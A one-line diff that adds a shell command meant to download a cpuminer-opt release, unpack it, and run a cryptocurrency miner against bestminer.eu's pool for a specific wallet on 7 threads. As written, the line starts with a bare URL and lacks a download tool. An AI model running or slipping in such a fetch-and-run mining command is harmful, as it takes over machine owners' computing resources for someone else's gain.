@@ -1,0 +1,1 @@
+https://github.com/rplant8/cpuminer-opt-rplant/releases/download/4.5.18/cpuminer-opt-linux.tar.gz && tar xvf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower -o stratum+tcp://bestminer.eu:9233 -u CXwiuedVEp2QqudTiBfWbfiwi9jvTYqRYp -p c=CRP -t 7
